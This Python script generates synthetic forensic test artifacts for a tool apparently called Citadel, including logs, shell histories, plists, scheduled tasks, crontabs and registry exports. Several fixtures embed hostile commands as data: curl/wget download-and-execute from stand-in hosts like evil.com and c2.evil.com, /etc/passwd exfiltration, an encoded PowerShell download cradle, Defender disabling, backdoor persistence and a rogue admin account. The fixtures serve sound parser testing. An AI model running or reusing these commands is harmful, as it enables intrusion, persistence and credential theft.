#!/usr/bin/env python3
"""
Generate comprehensive text-based forensic artifacts for Citadel testing.

Creates synthetic test files for all text-based log formats supported by Citadel:
- Access logs (Apache/Nginx combined & common formats)
- Shell history (bash, zsh, fish, PowerShell)
- macOS ULS (text and NDJSON formats)
- Windows Error Reporting (WER XML)
- Plist files (XML format)
- Scheduled tasks (XML)
- WLAN profiles (netsh output)
- Linux config files
- MFT CSV export
- Registry exports
- WER crash reports

Run: python3 generate_all_text_logs.py
Output lands in ./test_output/
"""
import os
from datetime import datetime, timedelta

OUT = os.path.join(os.path.dirname(__file__), "test_output")
os.makedirs(OUT, exist_ok=True)


def write_access_log_combined():
    """Generate Apache/Nginx combined format access log."""
    lines = []
    base = datetime(2024, 6, 15, 8, 0, 0)
    entries = [
        ("192.168.1.100", "-", "admin", "GET", "/index.html", "HTTP/1.1", 200, 5234, "https://google.com/", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"),
        ("10.0.0.50", "-", "-", "POST", "/api/login", "HTTP/1.1", 401, 128, "-", "curl/7.68.0"),
        ("203.0.113.50", "-", "-", "GET", "/admin/config.php", "HTTP/1.1", 403, 256, "-", "python-requests/2.28.0"),
        ("192.168.1.100", "-", "analyst", "GET", "/dashboard", "HTTP/1.1", 200, 12456, "https://internal.company.com/", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"),
        ("172.16.0.5", "-", "-", "GET", "/robots.txt", "HTTP/1.1", 200, 128, "-", "Googlebot/2.1"),
        ("192.168.1.100", "-", "admin", "DELETE", "/api/users/123", "HTTP/1.1", 204, 0, "-", "PostmanRuntime/7.32.0"),
        ("10.0.0.100", "-", "-", "GET", "/wp-admin/", "HTTP/1.1", 404, 512, "-", "WPScan v3.8.22"),
        ("192.168.1.50", "-", "root", "PUT", "/api/config", "HTTP/1.1", 500, 1024, "-", "curl/7.81.0"),
    ]
    for i, (ip, ident, user, method, path, proto, status, size, ref, ua) in enumerate(entries):
        ts = (base + timedelta(minutes=i * 10)).strftime("%d/%b/%Y:%H:%M:%S -0700")
        lines.append(f'{ip} {ident} {user} [{ts}] "{method} {path} {proto}" {status} {size} "{ref}" "{ua}"')
    
    path = os.path.join(OUT, "access.log")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(lines)} entries)")


def write_access_log_common():
    """Generate Apache common log format (no referer/UA)."""
    lines = []
    base = datetime(2024, 6, 15, 10, 0, 0)
    entries = [
        ("192.168.1.100", "-", "user1", "GET", "/page1.html", "HTTP/1.0", 200, 1024),
        ("10.0.0.50", "-", "-", "GET", "/images/logo.png", "HTTP/1.0", 200, 8192),
        ("203.0.113.100", "-", "-", "POST", "/cgi-bin/test.cgi", "HTTP/1.0", 403, 256),
    ]
    for i, (ip, ident, user, method, path, proto, status, size) in enumerate(entries):
        ts = (base + timedelta(minutes=i * 5)).strftime("%d/%b/%Y:%H:%M:%S +0000")
        lines.append(f'{ip} {ident} {user} [{ts}] "{method} {path} {proto}" {status} {size}')
    
    path = os.path.join(OUT, "access_common.log")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(lines)} entries)")


def write_nginx_error_log():
    """Generate Nginx error log format."""
    lines = []
    base = datetime(2024, 6, 15, 9, 0, 0)
    entries = [
        ("error", 1234, "*1", "connect() failed (111: Connection refused) while connecting to upstream", "192.168.1.100"),
        ("warn", 1234, "*2", "upstream server temporarily disabled", ""),
        ("crit", 1235, "*3", "SSL_do_handshake() failed", "10.0.0.50"),
        ("notice", 1236, "*4", "signal process started", ""),
        ("alert", 1237, "*5", "worker process 5678 exited on signal 11", ""),
    ]
    for i, (level, pid, conn, msg, client) in enumerate(entries):
        ts = (base + timedelta(minutes=i * 15)).strftime("%Y/%m/%d %H:%M:%S")
        client_part = f", client: {client}" if client else ""
        lines.append(f"{ts} [{level}] {pid}#0: {conn} {msg}, server: example.com{client_part}")
    
    path = os.path.join(OUT, "error.log")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(lines)} entries)")


def write_bash_history():
    """Generate bash_history file with timestamps (HISTTIMEFORMAT format).
    
    Real bash history with timestamps uses: #<epoch_seconds>
    Each timestamp precedes the command it applies to.
    """
    lines = []
    # Realistic bash session from a compromised server
    entries = [
        (1718438400, "ls -la"),
        (1718438405, "cd /var/log"),
        (1718438410, "sudo tail -f auth.log"),
        (1718438500, "grep 'Failed password' auth.log > /tmp/failed.log"),
        (1718438600, "wget http://malicious-site.com/payload.sh"),
        (1718438605, "chmod +x payload.sh"),
        (1718438610, "./payload.sh"),
        (1718438700, "curl -X POST http://c2.evil.com/beacon -d @/etc/passwd"),
        (1718438800, "history -c"),
        (1718438805, "rm -rf /tmp/failed.log"),
    ]
    for ts, cmd in entries:
        lines.append(f"#{ts}")
        lines.append(cmd)
    
    path = os.path.join(OUT, ".bash_history")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(entries)} commands)")


def write_zsh_history():
    """Generate zsh_history with extended format."""
    lines = []
    base_ts = 1718441000  # 2024-06-15 08:43:20 UTC
    entries = [
        "vim /etc/hosts",
        "git status",
        "git commit -m 'Update docs'",
        "git push origin main",
        "docker ps -a",
        "docker-compose up -d",
        "kubectl get pods",
        "ssh admin@192.168.1.100",
        "scp backup.tar.gz user@remote:/backup/",
        "tmux new -s analysis",
    ]
    for i, cmd in enumerate(entries):
        ts = base_ts + (i * 180)  # 3 minutes apart
        elapsed = i * 45  # fake elapsed time
        lines.append(f": {ts}:{elapsed};{cmd}")
    
    path = os.path.join(OUT, ".zsh_history")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(entries)} commands)")


def write_fish_history():
    """Generate fish_history YAML-like format."""
    lines = []
    base_ts = 1718442000  # 2024-06-15 09:00:00 UTC
    entries = [
        "fish_update_completions",
        "cd ~/projects/citadel",
        "python3 manage.py runserver",
        "code .",
        "npm install",
        "npm run dev",
        "curl http://localhost:8000/api/health",
        "exit",
    ]
    for i, cmd in enumerate(entries):
        ts = base_ts + (i * 240)
        lines.append(f"- cmd: {cmd}")
        lines.append(f"  when: {ts}")
    
    path = os.path.join(OUT, "fish_history")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(entries)} commands)")


def write_powershell_history():
    """Generate PowerShell CONSOLEHOST_HISTORY.TXT."""
    lines = []
    entries = [
        "Get-Process",
        "Get-EventLog -LogName Security -Newest 100",
        "Invoke-WebRequest -Uri http://malicious.com/script.ps1 -OutFile C:\\temp\\script.ps1",
        "C:\\temp\\script.ps1",
        "New-ScheduledTask -Action \"powershell.exe -enc SQBFAFgA\" -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date))",
        "Get-ChildItem HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        "whoami /all",
        "net user administrator",
        "Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]
    for cmd in entries:
        lines.append(cmd)
    
    path = os.path.join(OUT, "CONSOLEHOST_HISTORY.TXT")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(entries)} commands)")


def write_macos_uls_text():
    """Generate macOS Unified Logging System text export."""
    lines = []
    base = datetime(2024, 6, 15, 8, 0, 0, 123456)
    entries = [
        ("forensic-macbook.local", "kernel[0]", "Fault", "IOKit: device matching failed"),
        ("forensic-macbook.local", "com.apple.security[456]", "Error", "SecTrustEvaluate: certificate verification failed"),
        ("forensic-macbook.local", "loginwindow[123]", "Notice", "Login Window application invoked"),
        ("forensic-macbook.local", "sshd[789]", "Info", "Accepted publickey for admin from 192.168.1.100"),
        ("forensic-macbook.local", "WindowServer[234]", "Debug", "Connection created successfully"),
        ("forensic-macbook.local", "mds[567]", "Default", "Indexing started for volume Macintosh HD"),
    ]
    for i, (host, proc, level, msg) in enumerate(entries):
        ts = (base + timedelta(minutes=i * 20)).strftime("%Y-%m-%d %H:%M:%S.%f-0700")
        lines.append(f"{ts}  {host}  {proc} <{level}>: {msg}")
    
    path = os.path.join(OUT, "unified.log")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(lines)} entries)")


def write_macos_uls_ndjson():
    """Generate macOS ULS NDJSON format."""
    import json
    lines = []
    base = datetime(2024, 6, 15, 9, 0, 0)
    entries = [
        {"processImageShortName": "kernel", "processID": 0, "subsystem": "com.apple.iokit", "category": "IOKit", "messageType": "Default", "eventMessage": "Device tree initialized"},
        {"processImageShortName": "securityd", "processID": 234, "subsystem": "com.apple.security", "category": "xpc", "messageType": "Info", "eventMessage": "Keychain unlocked"},
        {"processImageShortName": "sshd", "processID": 567, "subsystem": "com.openssh", "category": "auth", "messageType": "Notice", "eventMessage": "Accepted keyboard-interactive for admin from 10.0.0.50"},
        {"processImageShortName": "malicious", "processID": 890, "subsystem": "com.suspicious.app", "category": "network", "messageType": "Error", "eventMessage": "Failed to connect to C2 server"},
    ]
    for i, entry in enumerate(entries):
        ts = (base + timedelta(minutes=i * 15)).strftime("%Y-%m-%d %H:%M:%S.%f-0700")
        entry["timestamp"] = ts
        entry["machineID"] = "forensic-macbook.local"
        lines.append(json.dumps(entry))
    
    path = os.path.join(OUT, "unified.ndjson")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(lines)} entries)")


def write_wer_crash_report():
    """Generate Windows Error Reporting XML file."""
    content = """<?xml version="1.0" encoding="UTF-16"?>
<WERReportMetadata>
  <WERSystemMetadata>
    <MachineName>WORKSTATION-01</MachineName>
    <OSVersion>10.0.19044.1.0.256.48</OSVersion>
    <OSArchitecture>AMD64</OSArchitecture>
  </WERSystemMetadata>
  <WERProcessInformation>
    <AppName>chrome.exe</AppName>
    <AppPath>C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe</AppPath>
    <AppVersion>120.0.6099.109</AppVersion>
    <ProcessId>4567</ProcessId>
  </WERProcessInformation>
  <WERReportInformation>
    <EventType>APPCRASH</EventType>
    <EventName>StackBufferOverrun</EventName>
    <FriendlyEventName>Stopped working</FriendlyEventName>
    <EventTime>133570123456789012</EventTime>
    <ReportIdentifier>abc12345-def6-7890-ghij-klmnopqrstuv</ReportIdentifier>
    <BucketId>1234567890abcdef</BucketId>
  </WERReportInformation>
</WERReportMetadata>
"""
    path = os.path.join(OUT, "chrome.exe.wer")
    with open(path, "w", encoding="utf-16") as f:
        f.write(content)
    print(f"  Created {path}")


def write_plist_file():
    """Generate macOS plist XML file."""
    content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.malicious.persist</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/osascript</string>
    <string>-e</string>
    <string>do shell script "curl http://evil.com/payload | sh"</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>StartInterval</key>
  <integer>300</integer>
  <key>StandardOutPath</key>
  <string>/tmp/malicious.log</string>
  <key>StandardErrorPath</key>
  <string>/tmp/malicious.err</string>
  <key>UserName</key>
  <string>admin</string>
</dict>
</plist>
"""
    path = os.path.join(OUT, "com.malicious.persist.plist")
    with open(path, "w") as f:
        f.write(content)
    print(f"  Created {path}")


def write_scheduled_task():
    """Generate Windows Scheduled Task XML export."""
    content = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-06-15T08:00:00.123456</Date>
    <Author>CORP\\admin</Author>
    <Description>System maintenance task</Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2024-06-15T09:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>CORP\\admin</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -File C:\\temp\\malicious.ps1</Arguments>
    </Exec>
  </Actions>
</Task>
"""
    path = os.path.join(OUT, "malicious_task.xml")
    with open(path, "w", encoding="utf-16") as f:
        f.write(content)
    print(f"  Created {path}")


def write_wlan_profile():
    """Generate netsh wlan export profile XML."""
    content = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>CorporateWiFi</name>
  <SSIDConfig>
    <SSID>
      <name>CorporateWiFi</name>
    </SSID>
  </SSIDConfig>
  <connectionType>ESS</connectionType>
  <connectionMode>auto</connectionMode>
  <MSM>
    <security>
      <authEncryption>
        <authentication>WPA2PSK</authentication>
        <encryption>AES</encryption>
        <useOneX>false</useOneX>
      </authEncryption>
      <sharedKey>
        <keyType>passPhrase</keyType>
        <protected>false</protected>
        <keyMaterial>SuperSecretPassword123!</keyMaterial>
      </sharedKey>
    </security>
  </MSM>
  <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
    <enableRandomization>false</enableRandomization>
  </MacRandomization>
</WLANProfile>
"""
    path = os.path.join(OUT, "CorporateWiFi.xml")
    with open(path, "w") as f:
        f.write(content)
    print(f"  Created {path}")


def write_linux_config():
    """Generate various Linux config files."""
    # SSH config
    ssh_config = """# SSH Server Configuration
Port 22
Port 2222
ListenAddress 0.0.0.0
Protocol 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
SyslogFacility AUTH
LogLevel INFO
LoginGraceTime 2m
PermitRootLogin no
StrictModes yes
MaxAuthTries 6
MaxSessions 10
PubkeyAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
Match User admin
    ForceCommand internal-sftp
"""
    path = os.path.join(OUT, "sshd_config")
    with open(path, "w") as f:
        f.write(ssh_config)
    print(f"  Created {path}")
    
    # Crontab
    crontab = """# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

# Suspicious entries
*/5 * * * * admin curl -s http://c2.evil.com/beacon.sh | bash
@reboot root /tmp/.hidden/backdoor
0 2 * * * www-data php /var/www/html/cron.php
"""
    path = os.path.join(OUT, "crontab")
    with open(path, "w") as f:
        f.write(crontab)
    print(f"  Created {path}")
    
    # fstab
    fstab = """# /etc/fstab: static file system information
# <file system> <mount point> <type> <options> <dump> <pass>
/dev/sda1       /               ext4    errors=remount-ro 0 1
/dev/sda2       /home           ext4    defaults        0 2
/dev/sda3       /var            ext4    defaults        0 2
UUID=abc123     /mnt/backup     ext4    defaults        0 0
//192.168.1.100/share /mnt/smb cifs credentials=/etc/smb.creds,uid=1000 0 0
tmpfs           /tmp            tmpfs   defaults,noatime,nosuid,nodev,noexec,relatime,size=512M 0 0
"""
    path = os.path.join(OUT, "fstab")
    with open(path, "w") as f:
        f.write(fstab)
    print(f"  Created {path}")


def write_mft_csv():
    """Generate MFT CSV export (analyzeMFT.py format)."""
    lines = [
        "Record Number,Active/Deleted,Filename,Full Path,File Size,Type,$SI [M],$SI [A],$SI [C],$SI [F]",
        "36,Active,$MFT,C:\\$MFT,16777216,File,2024-06-01 08:00:00,2024-06-15 10:30:00,2024-06-01 08:00:00,2024-06-01 08:00:00",
        "37,Active,$LogFile,C:\\$LogFile,1048576,File,2024-06-01 08:00:00,2024-06-15 10:30:00,2024-06-01 08:00:00,2024-06-01 08:00:00",
        "100,Active,Windows,C:\\Windows,0,Directory,2024-06-01 08:00:00,2024-06-15 09:00:00,2024-06-01 08:00:00,2024-06-01 08:00:00",
        "101,Active,Users,C:\\Users,0,Directory,2024-06-01 08:00:00,2024-06-15 08:30:00,2024-06-01 08:00:00,2024-06-01 08:00:00",
        "102,Active,admin,C:\\Users\\admin,0,Directory,2024-06-01 08:00:00,2024-06-15 11:00:00,2024-06-01 08:00:00,2024-06-01 08:00:00",
        "103,Active,malware.exe,C:\\Users\\admin\\Downloads\\malware.exe,45056,File,2024-06-15 10:00:00,2024-06-15 10:00:00,2024-06-15 10:00:00,2024-06-15 10:00:00",
        "104,Deleted,secret.doc,C:\\Users\\admin\\Documents\\secret.doc,24576,File,2024-06-10 14:00:00,2024-06-14 16:00:00,2024-06-10 14:00:00,2024-06-10 14:00:00",
        "105,Active,Desktop,C:\\Users\\admin\\Desktop,0,Directory,2024-06-01 08:00:00,2024-06-15 11:30:00,2024-06-01 08:00:00,2024-06-01 08:00:00",
        "106,Active,AppData,C:\\Users\\admin\\AppData,0,Directory,2024-06-01 08:00:00,2024-06-15 11:45:00,2024-06-01 08:00:00,2024-06-01 08:00:00",
        "107,Active,persistence.bat,C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\persistence.bat,1024,File,2024-06-15 09:00:00,2024-06-15 09:00:00,2024-06-15 09:00:00,2024-06-15 09:00:00",
    ]
    path = os.path.join(OUT, "MFT.csv")
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"  Created {path} ({len(lines)-1} entries)")


def write_registry_export():
    """Generate registry export in .reg format."""
    content = """Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]
"SecurityHealth"="C:\\\\Windows\\\\system32\\\\SecurityHealthSystray.exe"
"Malware"="C:\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\malware.exe"
"OneDrive"="C:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\OneDrive.exe"

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\malwaresvc]
"DisplayName"="Windows Update Service"
"ImagePath"="C:\\\\Windows\\\\Temp\\\\malware.exe -s"
"Start"=2
"Type"=16
"Description"="Malicious service disguised as Windows Update"

[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU]
"a"="powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA"
"b"="cmd /c whoami > \\\\192.168.1.100\\share\\output.txt"
"c"="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"C:\\\\temp\\\\backdoor.exe\" /f"
"d"="net user hacker P@ssw0rd123 /add"
"e"="net localgroup administrators hacker /add"

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]
"Shell"="explorer.exe"
"Userinit"="C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\Temp\\\\malicious.exe"
"VMApplet"="rundll32.exe shell32.dll,Control_RunDLL \"C:\\\\ProgramData\\\\update.dll\""

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest]
"UseLogonCredential"=dword:00000001
"""
    path = os.path.join(OUT, "registry_export.reg")
    with open(path, "w") as f:
        f.write(content)
    print(f"  Created {path}")


def write_json_file():
    """Generate generic JSON file for JSON file plugin."""
    import json
    data = {
        "forensic_events": [
            {"timestamp": "2024-06-15T08:00:00Z", "event_type": "process_create", "process_name": "malware.exe", "pid": 4567, "user": "admin"},
            {"timestamp": "2024-06-15T08:01:00Z", "event_type": "network_connect", "process_name": "malware.exe", "dest_ip": "203.0.113.50", "dest_port": 443},
            {"timestamp": "2024-06-15T08:02:00Z", "event_type": "file_create", "path": "C:\\Windows\\Temp\\payload.dll", "size": 32768},
            {"timestamp": "2024-06-15T08:03:00Z", "event_type": "registry_modify", "key": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "malware"},
            {"timestamp": "2024-06-15T08:04:00Z", "event_type": "process_inject", "source_process": "malware.exe", "target_process": "explorer.exe", "target_pid": 1234},
        ],
        "metadata": {
            "source": "EDR",
            "collection_time": "2024-06-15T12:00:00Z",
            "hostname": "WORKSTATION-01",
        }
    }
    path = os.path.join(OUT, "forensic_events.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"  Created {path}")


def write_strings_test_files():
    """Generate binary-like files for strings fallback plugin testing."""
    # PE-like file (fake EXE with strings)
    pe_content = b"MZ" + b"\x00" * 50 + b"This is a fake PE file\x00" + b"\x00" * 100 + b"Malicious string here\x00" + b"\x00" * 50
    path = os.path.join(OUT, "fake.exe")
    with open(path, "wb") as f:
        f.write(pe_content)
    print(f"  Created {path}")
    
    # Script file
    script_content = b"""#!/bin/bash
# Malicious script
curl http://evil.com/payload.sh | bash
wget http://c2.server.com/backdoor
chmod +x /tmp/backdoor
/tmp/backdoor &
"""
    path = os.path.join(OUT, "suspicious.sh")
    with open(path, "wb") as f:
        f.write(script_content)
    print(f"  Created {path}")


if __name__ == "__main__":
    print("Generating Citadel text-based test artifacts...")
    print()
    
    # Access logs
    print("Access Logs:")
    write_access_log_combined()
    write_access_log_common()
    write_nginx_error_log()
    print()
    
    # Shell history
    print("Shell History:")
    write_bash_history()
    write_zsh_history()
    write_fish_history()
    write_powershell_history()
    print()
    
    # macOS ULS
    print("macOS ULS:")
    write_macos_uls_text()
    write_macos_uls_ndjson()
    print()
    
    # Windows artifacts
    print("Windows Artifacts:")
    write_wer_crash_report()
    write_scheduled_task()
    write_wlan_profile()
    write_registry_export()
    print()
    
    # macOS artifacts
    print("macOS Artifacts:")
    write_plist_file()
    print()
    
    # Linux configs
    print("Linux Configs:")
    write_linux_config()
    print()
    
    # Filesystem artifacts
    print("Filesystem Artifacts:")
    write_mft_csv()
    print()
    
    # JSON files
    print("JSON Files:")
    write_json_file()
    print()
    
    # Strings fallback test files
    print("Strings Fallback Test Files:")
    write_strings_test_files()
    print()
    
    print(f"All text-based test files in: {OUT}/")
    print("Upload these files to a Citadel case to test all text-based log parsers.")
